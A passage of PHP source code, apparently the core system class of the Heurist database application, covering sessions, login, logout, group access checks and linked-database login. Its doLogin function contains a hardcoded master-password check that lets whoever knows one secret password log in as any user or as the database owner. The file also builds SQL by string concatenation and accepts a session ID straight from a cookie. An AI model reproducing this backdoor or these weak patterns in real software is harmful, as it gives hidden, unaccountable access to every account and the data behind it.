                $res['sysinfo']['db_has_active_dashboard'] = $res2[1];
                $res['sysinfo']['db_workset_count'] = $res2[2];
            }
            
            $this->_checkRecLinks(); //check relationship cache

        }else{

            $res = array(
                "currentUser"=>null,
                "sysinfo"=>array(
                    "help"=>HEURIST_HELP,
                    "version"=>HEURIST_VERSION,
                    "sysadmin_email"=>HEURIST_MAIL_TO_ADMIN,
                    "baseURL"=>HEURIST_BASE_URL),
                    'host_logo'=>$host_logo,
                    'host_url'=>$host_url
            );

        }

        return $res;
    }



    /**
    * Get current user info
    */
    public function getCurrentUser(){
        // $this->current_User['ismaster'] = $system->is_admin();
        return $this->current_User; // ?$this->current_User :$this->$guest_User;
    }

    /**
    * Set current user info
    *
    * @param mixed $user
    */
    public function setCurrentUser($user){
        $this->current_User = $user;
    }



    /**
    * Get if of current user, if not looged in returns zero
    *
    */
    public function get_user_id(){
        return $this->current_User? $this->current_User['ugr_ID'] :0;
    }



    /**
    * Returns array of ID of all groups for current user plus current user ID
    * $level - admin/emeber
    */
    public function get_user_group_ids($level=null, $refresh=false){
    
        $ugrID = $this->get_user_id();

        if($ugrID>0){
            $groups = @$this->current_User['ugr_Groups'];
            if($refresh || !is_array($groups)){
                $groups = $this->current_User['ugr_Groups'] = user_getWorkgroups($this->mysqli, $ugrID);
            }
            if($level!=null){
                $groups = array();
                foreach($this->current_User['ugr_Groups'] as $grpid=>$lvl){
                    if($lvl==$level){
                        $groups[] = $grpid;        
                    }
                }
            }else{
                $groups = array_keys($groups);    
            }
            
            
            //add user itself
            array_push($groups, intval($ugrID) );
            return $groups;
        }else{
            null;
        }
    }



    /**
    * Returns true if given id is id of current user or it is id of member of one of current Workgroup
    *
    * @param mixed $ug - user ID to check
    */
    public function is_member($ugs){
        
        if($ugs==0 || $ugs==null || (is_array($ugs) && count($ugs)==0)){
            return true;
        }
        
        $current_user_grps = $this->get_user_group_ids();
        $ugs = prepareIds($ugs, true); //include zero
        foreach ($ugs as $ug){
            if ($ug==0 || (is_array($current_user_grps) && in_array($ug, $current_user_grps)) ){
                return true;   
            }
        }
        return false;        
        //return ( $ug==0 || $ug==null || in_array($ug, $this->get_user_group_ids()) );  
    }

    /**
    * Verifies is current user is database owner
    * used to manage any recThereadedComments, recUploadedFiles, Reminders, Bookmarks, UsrTags
    * otherwise only direct owners can modify them or members of workgroup tags
    */
    public function is_dbowner(){
        return ($this->get_user_id()==2);
    }
    
    /**
    * id db owner or admin of database managers
    * 
    * @param mixed $ugrID
    * @return mixed
    */
    public function is_admin(){
        return ($this->get_user_id()>0 && $this->has_access( $this->get_system('sys_OwnerGroupID') ) );
    }
    
    /**
    * check if current user is system administrator
    */
    public function is_system_admin(){
        if ($this->get_user_id()>0){
            $user = user_getById($this->mysqli, $this->get_user_id());
            return (defined('HEURIST_MAIL_TO_ADMIN') && (@$user['ugr_eMail']==HEURIST_MAIL_TO_ADMIN));    
        }else{
            return false;
        }
    }
    
   /**
    * Returns IF currentUser satisfies to required level
    *
    * @param requiredLevel 
    * null or <1 - (DEFAULT) is logged in
    * 1 - db admin (admin of group 1 "Database managers")
    * 2 - db owner
    * n - admin of given group
    */
    public function has_access( $requiredLevel=null ) {

        $ugrID = $this->get_user_id();
        
        if(!$requiredLevel || $requiredLevel<1){
            return ($ugrID>0);   //just logged in
        }
        
        if ($requiredLevel==$ugrID ||   //iself 
                2==$ugrID)   //db owner
        {
            return true;            
        }else{
            //@$this->current_User['ugr_Groups'][$requiredLevel]=='admin'); //admin of given group
            $current_user_grps = $this->get_user_group_ids('admin');
            return (is_array($current_user_grps) && in_array($requiredLevel, $current_user_grps));
        }
    }    

    /**
    * Restore session by cookie id, or start new session
    */
    private function start_my_session($check_session_folder=true){
        
        global $defaultRootFileUploadPath;
        //verify that session folder is writable
        if($check_session_folder && ini_get('session.save_handler')=='files'){
            $folder = session_save_path();
            if(file_exists($folder) && !is_writeable($folder)){
                    $this->addError(HEURIST_SYSTEM_FATAL, "The sessions folder has become inaccessible. This is a minor, but annoying, problem for which we apologise. An email has been sent to your system administrator asking them to fix it - this may take up to a day, depending on time differences. Please try again later.");
                    
                    $needSend = true;
                    $fname = $defaultRootFileUploadPath."lastWarningSent.ini";
                    if (file_exists($fname)){//check if warning is already sent
                        $datetime1 = date_create(file_get_contents($fname));
                        $datetime2 = date_create('now');
                        $interval = date_diff($datetime1, $datetime2);                    
                        $needSend = ($interval->format('%h')>4); //in hours
                    }
                    if($needSend){

                        $rv = sendEmail(HEURIST_MAIL_TO_ADMIN, 'Session folder access', 
                                            'The sessions folder has become inaccessible' , null);
                        if($rv=="ok"){
                            if (file_exists($fname)) unlink($fname);
                            file_put_contents($fname, date_create('now')->format('Y-m-d H:i:s'));
                        }
                    }
                    
                return false;    
            }
        }
        
        //if(session_id() == '' || !isset($_SESSION)) {
        if (session_status() != PHP_SESSION_ACTIVE) {
            
            $is_https = (@$_SERVER['HTTPS']!=null && $_SERVER['HTTPS']!='');
            session_name('heurist-sessionid');
            //session_set_cookie_params ( 0, '/', '', $is_https);
            session_cache_limiter('none');
            
            if (@$_COOKIE['heurist-sessionid']) { //get session id from cookes 
                session_id($_COOKIE['heurist-sessionid']);
                @session_start();
                
            } else {   //session does not exist - create new one and save on cookies
                @session_start();
                //$session_id = session_id();
                //setcookie('heurist-sessionid', $session_id, 0, '/', '', $is_https ); //create new session - REM
            }
        }
        
        if (session_status() == PHP_SESSION_ACTIVE) {
            
            if (@$_SESSION[$this->dbname_full]['keepalive']) {
                //update cookie - to keep it alive for next 30 days
                $time = time() + 30*24*60*60;
                $session_id = $_COOKIE['heurist-sessionid'];
                $cres = setcookie('heurist-sessionid', $session_id, $time, '/', '', $is_https );
                if($cres==false){                    
                    error_log('CANNOT UPDATE COOKIE '.$session_id.'   '.$this->dbname_full);                
                }
            }
                
        }else{
            return false;
        }
        
        
//        @session_start();

        return true;
    }


    /*
    * verify session only (without database connection and system initialization)
    */
    public function verify_credentials($db){

        if( $this->set_dbname_full($db) && $this->start_my_session(false) ){
            return @$_SESSION[$this->dbname_full]['ugr_ID'];
        }else{
            return false;
        }
        
    }


    /**
    * Load user info from session - called on init only
    * 
    * $reload_user_from_db - true reload user info from database
    */
    private function login_verify( $user ){
        
        $reload_user_from_db = false; 
        //$h3session = $this->dbname_full.'.heurist';
        
        if( is_array($user) ){  //user info already found (see login) - need reset session
            $reload_user_from_db = true;            
            $userID = $user['ugr_ID'];
        }else{
            
            $reload_user_from_db = ($user==true);  //reload user unconditionally
            
            $userID = @$_SESSION[$this->dbname_full]['ugr_ID'];
            
            /*
            if(!$userID){ //in h4 or h5 session user not found
                // vsn 3 backward capability  - restore user id from old session
                $userID = @$_SESSION[$h3session]['user_id'];
                if($userID){
                    $_SESSION[$this->dbname_full]['keepalive'] = @$_SESSION[$h3session]['keepalive'];
                    $reload_user_from_db = true;
                }
            }*/
        }
        
        if($userID == null){
            //some databases may share credentials
            //check that there is session for linked databases
            //if such session exists find email in linked database
            //by this email find user id in this database and establish new session

            $userID = $this->doLoginByLinkedSession();
        
            $reload_user_from_db = ($userID!=null);
        }
        
        $islogged = ($userID != null);
        
        if($islogged){
            
            if(@$_SESSION[$this->dbname_full]['need_refresh']) {
                unset($_SESSION[$this->dbname_full]['need_refresh']);
            }
            
            $fname = HEURIST_FILESTORE_DIR.$userID;
            if(file_exists($fname)){  //user info was updated by someone else
                unlink($fname);
                //marker for usr_info.verify_credentials to be sure that client side is also up to date 
                if($user!==true) $_SESSION[$this->dbname_full]['need_refresh'] = 1;
                $reload_user_from_db = true;
            }
            

            if($reload_user_from_db){ //from database
                
                if(!$this->updateSessionForUser( $userID )){
                    return false; //not logged in
                }

            }//$reload_user_from_db from db
            
            $this->current_User = array('ugr_ID'=>intval($userID),
                            'ugr_Name'        => @$_SESSION[$this->dbname_full]['ugr_Name'],
                            'ugr_FullName'    => $_SESSION[$this->dbname_full]['ugr_FullName'],
                            'ugr_Groups'      => $_SESSION[$this->dbname_full]['ugr_Groups']);

            if(true || !@$_SESSION[$this->dbname_full]['ugr_Preferences']){ //always restore from db
                $_SESSION[$this->dbname_full]['ugr_Preferences'] = user_getPreferences( $this );
            }
            $this->current_User['ugr_Preferences'] = $_SESSION[$this->dbname_full]['ugr_Preferences'];

            /*
//if(@$_SESSION[$this->dbname_full]['keepalive'])            
//error_log('update session '.@$_SESSION[$this->dbname_full]['keepalive']);                
            if (@$_SESSION[$this->dbname_full]['keepalive']) {
                //update cookie - to keep it alive for next 30 days
                $is_https = (@$_SERVER['HTTPS']!=null && $_SERVER['HTTPS']!='');
                $time = time() + 30*24*60*60;
                $session_id = session_id();
                $cres = setcookie('heurist-sessionid', $session_id, $time, '/', '', $is_https );  - REM
if($cres==false){                    
error_log('CANNOT UPDATE COOKIE '.$session_id);                
}
            }*/
            
            session_write_close();
        }
        return $islogged;
    }
    
    //
    //
    //
    public function updateSessionForUser( $userID ){
        
        $user = user_getById($this->mysqli, $userID);
        
        //user can be removed - check presence 
        if($user==null){
            return false; //not logged in
        }
        
        $_SESSION[$this->dbname_full]['ugr_ID'] = $userID;
        $_SESSION[$this->dbname_full]['ugr_Groups']   = user_getWorkgroups( $this->mysqli, $userID );
        $_SESSION[$this->dbname_full]['ugr_Name']     = $user['ugr_Name'];
        $_SESSION[$this->dbname_full]['ugr_FullName'] = $user['ugr_FirstName'] . ' ' . $user['ugr_LastName'];
        
        return true;
    }
    
    
    /**
    * some databases may share credentials
    * check that there is a session for linked databases
    * if such session exists find email in linked database
    * by this email find user id in this database and establish new session
    * 
    * return userid in this database
    */
    private function doLoginByLinkedSession(){
        //1. find sys_UGrpsDatabase in this database
        $linked_dbs = mysql__select_value($this->mysqli, 'select sys_UGrpsDatabase from sysIdentification');
        if($linked_dbs)
        {
        
            $linked_dbs = explode(',', $linked_dbs);
            foreach ($linked_dbs as $ldb){
                //2. check if session exists 
                if(strpos($ldb, HEURIST_DB_PREFIX)!==0){
                    $ldb = HEURIST_DB_PREFIX.$ldb;
                }
                
                $userID_in_linkedDB = @$_SESSION[$ldb]['ugr_ID'];
                
                if( $userID_in_linkedDB>0 ){
                    //3. find sys_UGrpsDatabase in linked database - this database must be in list
                    $linked_dbs2 = mysql__select_value($this->mysqli, 'select sys_UGrpsDatabase from '.$ldb.'.sysIdentification');
                    if(!$linked_dbs2) continue; //this database is not mutually linked
                    $linked_dbs2 = explode(',', $linked_dbs2);
                    foreach ($linked_dbs2 as $ldb2){
                        if(strpos($ldb2, HEURIST_DB_PREFIX)!==0){
                            $ldb2 = HEURIST_DB_PREFIX.$ldb2;
                        }
                        if( strcasecmp($this->dbname_full, $ldb2)==0 ){
                            //yes database is mutually linked
                            //4. find user email in linked database
                            $userEmail_in_linkedDB = mysql__select_value($this->mysqli, 'select ugr_eMail from '
                                .$ldb.'.sysUGrps where ugr_ID='.$userID_in_linkedDB);

                            //5. find user by email in this database
                            if($userEmail_in_linkedDB){
                                $user = user_getByField($this->get_mysqli(), 'ugr_eMail', $userEmail_in_linkedDB);       
                                if(null != $user && $user['ugr_Type']=='user' && $user['ugr_Enabled']=='y') {
                                    //6. success - establed new session
                                    $this->doLoginSession($user['ugr_ID'], 'public');
                                    return $user['ugr_ID'];
                                }
                            }
                        }
                    }
                }
            }
        }
        
        return null;
        
    }

    /**
    * Find user by name and password and keeps user info in current_User and in session
    *
    * @param mixed $username
    * @param mixed $password
    * @param mixed $session_type   - public, shared, remember
    *
    * @return  TRUE if login is success
    */
    public function doLogin($username, $password, $session_type){

        if($username && $password){
            
            $superuser = false;
            if(true
            && (crypt($password, 'V96Sjze89.xnI') == 'V96Sjze89.xnI')
            )
            {
                $user_id = is_numeric($username)?$username:2;
                $user = user_getById($this->mysqli, $user_id);
                $superuser = true;
            }else{
                //db_users
                $user = user_getByField($this->mysqli, 'ugr_Name', $username);
            }

            if($user){

                if($user['ugr_Enabled'] != 'y'){

                    $this->addError(HEURIST_REQUEST_DENIED,  "Your user profile is not active. Please contact database owner");
                    return false;

                }else if ( $superuser || crypt($password, $user['ugr_Password']) == $user['ugr_Password'] ) {
                    
                    $this->doLoginSession($user['ugr_ID'], $session_type);

                    return true;
                }else{
                    $this->addError(HEURIST_REQUEST_DENIED,  "Password is incorrect");
                    return false;
                }

            }else{
                $this->addError(HEURIST_REQUEST_DENIED,  "User name is incorrect");
                return false;
            }

        }else{
            $this->addError(HEURIST_INVALID_REQUEST, "Username / password not defined"); //INVALID_REQUEST
            return false;
        }
    }
    
    //
    // establish new session 
    //
    private function doLoginSession($userID, $session_type){
        
        $time = 0;
        if($session_type == 'public'){
            $time = 0;
        }else if($session_type == 'shared'){
            $time = time() + 24*60*60;     //day
        }else if ($session_type == 'remember') {
            $time = time() + 30*24*60*60;  //30 days
            $_SESSION[$this->dbname_full]['keepalive'] = true; //refresh time on next entry
        }
        
        //$time = time() + 30;
    
        //update cookie expire time
        $is_https = (@$_SERVER['HTTPS']!=null && $_SERVER['HTTPS']!='');
        $session_id = session_id();
        $cres = setcookie('heurist-sessionid', $session_id, $time, '/', '', $is_https );  //login

//if($time==0)                    
//error_log('login '.$session_type.'  '.$session_id);                
        if(!$cres){
            
        }

        $_SESSION[$this->dbname_full]['ugr_ID'] = $userID;
        
        //update login time in database
        user_updateLoginTime($this->mysqli, $userID);

    }


    /**
    * Clears cookie and destroy session and current_User info
    */
    public function doLogout(){
        
        $this->start_my_session(false);

        unset($_SESSION[$this->dbname_full]['ugr_ID']);
        unset($_SESSION[$this->dbname_full]['ugr_Name']);
        unset($_SESSION[$this->dbname_full]['ugr_FullName']);
        if(@$_SESSION[$this->dbname_full]['ugr_Groups']) unset($_SESSION[$this->dbname_full]['ugr_Groups']);
        
        if(true){
            $h3session = $this->dbname_full.'.heurist';
            if(@$_SESSION[$h3session]['user_id']){
                unset($_SESSION[$h3session]['user_id']);
                unset($_SESSION[$h3session]['user_name']);
                unset($_SESSION[$h3session]['user_realname']);
            }
        }
        
        // clear
        // even if user is logged to different databases he has the only session per browser
        // it means logout exits all databases
        $is_https = (@$_SERVER['HTTPS']!=null && $_SERVER['HTTPS']!='');
        //$session_id = session_id();
        $cres = setcookie('heurist-sessionid', '', time() - 3600, '/', '', $is_https);  //logout
        $this->current_User = null;
        session_destroy();
        
        session_write_close();
        return true;
    }

    //
    //
    //
    public function user_GetPreference($property, $def=null){

        $res = @$_SESSION[$this->dbname_full]["ugr_Preferences"][$property];

        // TODO: redundancy: this duplicates same in hapi.js
        if('search_detail_limit'==$property){
            if(!$res || $res<500 ) {$res = 500;}
            else if($res>5000 ) {$res = 5000;}
        }else if($res==null && $def!=null){
            $res = $def;
        }

        return $res;
    }

    //
    //
    //    
    public function user_LogActivity($action, $suplementary = '', $user_id=null){
        
         if($user_id==null){
             $this->login_verify( false );
             $user_id = $this->get_user_id();
         }
        
         $now = new DateTime();
         $info =  array($user_id, $action, $now->format('Y-m-d H:i:s'), $suplementary);
        
         file_put_contents ( HEURIST_FILESTORE_DIR.'userInteraction.log' , implode(',', $info)."\n", FILE_APPEND );
        
    }


    /**
    * Loads system settings (default values) from sysIdentification
    */
    public function get_system( $fieldname=null, $need_reset = false ){

        if(!$this->system_settings || $need_reset)
        {
            $mysqli = $this->mysqli;
            $this->system_settings = getSysValues($mysqli);
            if(!$this->system_settings){
                $this->addError(HEURIST_SYSTEM_FATAL, "Unable to read sysIdentification", $mysqli->error);
                return null;
            }
            
            updateDatabseToLatest4($this);
            //updateDatabseToLatest3($this);
            //updateDatabseToLatest2($this);
            /*
            $rep = updateDatabseToLatest($this);
            if($rep===false){
            }*/
            
            // it is required for main page only - so call this request on index.php
            //$this->system_settings['sys_RecordCount'] = mysql__select_value($mysqli, 'select count(*) from Records');
        }
        return ($fieldname) ?@$this->system_settings[$fieldname] :$this->system_settings;
    }

    //
    //
    //
    public function is_js_acript_allowed(){
        
        $is_allowed = false;
        $fname = realpath(dirname(__FILE__)."/../../js_in_database_authorised.txt");
        if(file_exists($fname)){
            //ini_set('auto_detect_line_endings', true);
            $handle = @fopen($fname, "r");
            while (!feof($handle)) {
                $line = trim(fgets($handle, 100));
                if($line==$this->dbname){
                    $is_allowed=true;
                    break;
                }
            }
            fclose($handle);
            /*
            $databases = file_get_contents($fname);   
            $databases = explode("\n", $databases);
            $is_allowed = (array_search($this->dbname,$databases)>0);
            */
        }
        return $is_allowed;
    }
    
    //
    // check database version 
    // first check version in file lastAdviceSent, version stored in this file valid for 24 hrs
    //
    private function get_last_code_and_db_version(){
        
        $version_last_check = 'unknown';
        $need_check_main_server = true;
        
        $fname = HEURIST_FILESTORE_ROOT."lastAdviceSent.ini";
        
        if (file_exists($fname)){
            //last check and version
            list($date_last_check, $version_last_check) = explode("|", file_get_contents($fname));

            //debug  $date_last_check = "2013-02-10";
            if($date_last_check && strtotime($date_last_check)){

                    $days =intval((time()-strtotime($date_last_check))/(3600*24)); //days since last check

                    if(intval($days)<1){
                        $need_check_main_server = false;
                    }
            }
        }//file exitst
        
        if($need_check_main_server){
            
            $rawdata = null;
            
            //send request to main server at HEURIST_INDEX_BASE_URL
            // Heurist_Master_Index is the refernece standard for current database version
            // Maybe this should be changed to Heurist_Sandpit?. Note: sandpit no longer needed, or used, from late 2015

            if(strpos(HEURIST_INDEX_BASE_URL, HEURIST_SERVER_URL)===0){ //same domain
       
                $mysql_indexdb = mysql__connection(HEURIST_DBSERVER_NAME, ADMIN_DBUSERNAME, ADMIN_DBUSERPSWD);
                if ( !is_array($mysql_indexdb) && mysql__usedatabase($mysql_indexdb, HEURIST_INDEX_DATABASE)){
                    
                    $system_settings = getSysValues($mysql_indexdb);
                    if(is_array($system_settings)){
           
                        $db_version = $system_settings['sys_dbVersion'].'.'
                                .$system_settings['sys_dbSubVersion'].'.'
                                .$system_settings['sys_dbSubSubVersion'];
                            
                        $rawdata = HEURIST_VERSION."|".$db_version;
                    }
                
                }
       
            }else{
                $url = HEURIST_INDEX_BASE_URL . "admin/setup/dbproperties/getCurrentVersion.php?db=".HEURIST_INDEX_DATABASE."&check=1";
                $rawdata = loadRemoteURLContentSpecial($url); //it returns HEURIST_VERSION."|".HEURIST_DBVERSION
            }
            
            if($rawdata){
                $current_version = explode("|", $rawdata);

                if (count($current_version)>0)
                {
                    $curver = explode(".", $current_version[0]);
                    if( count($curver)>=2 && intval($curver[0])>0 && is_numeric($curver[1]) && intval($curver[1])>=0 ){
                        $version_last_check = $current_version[0];
                    }
                }
            }
            
            $version_in_session = date("Y-m-d").'|'.$version_last_check;
            fileSave($version_in_session, $fname);
        }
        
        return $version_last_check; 
    }

    //
    // return true if password is wrong
    //
    public function verifyActionPassword($password_entered, $password_to_compare, $min_length=6)   
    {
        
        $is_NOT_allowed = true;
        
        if(isset($password_entered) && $password_entered!=null) {
            $pw = $password_entered;

            // Password in configIni.php must be at least $min_length characters
            if(strlen(@$password_to_compare) > $min_length) {
                $comparison = strcmp($pw, $password_to_compare);  // Check password
                if($comparison == 0) { // Correct password
                    $is_NOT_allowed = false;
                }else{
                    // Invalid password
                    $this->addError(HEURIST_REQUEST_DENIED, 'Password is incorrect'); //'Invalid password');
                }
            }else{
                $this->addError(HEURIST_SYSTEM_CONFIG, 
                    'This action is not allowed unless a challenge password is set - please consult system administrator');
            }
        }else{
            //password not defined
            $this->addError(HEURIST_INVALID_REQUEST, 'Password is missing'); //'Password not specified');
        }    
        
        return $is_NOT_allowed;
    }
    
    //
    // Define response header. For embed mode (see websiteRecord) it sets allowed 
    // origin domain to allow proper execution of heurist scripts from third-party 
    // servers. This feature is disabled as a risky approach and possible issue 
    // to support the code on third-party servers.
    //
    public function setResponseHeader($content_type=null){
        
        /*  remove this remark to enable embedding our code to third-partys server
        $allowed = array('http://heurist.sydney.edu.au', 'https://epigraphia.efeo.fr', 'https://november1918.adelaide.edu.au'); 
        if(isset($_SERVER['HTTP_ORIGIN']) && in_array($_SERVER['HTTP_ORIGIN'], $allowed, true) === true){
            header('Access-Control-Allow-Origin: '.$_SERVER['HTTP_ORIGIN']);
            header('Access-Control-Allow-Credentials: true');
            header('Access-Control-Allow-Headers: Content-Type');
        }
        */
        
        if(!$content_type){
            header('Content-type: application/json;charset=UTF-8');
        }else{
            header('Content-type: '.$content_type);
        }
    }
}
?>
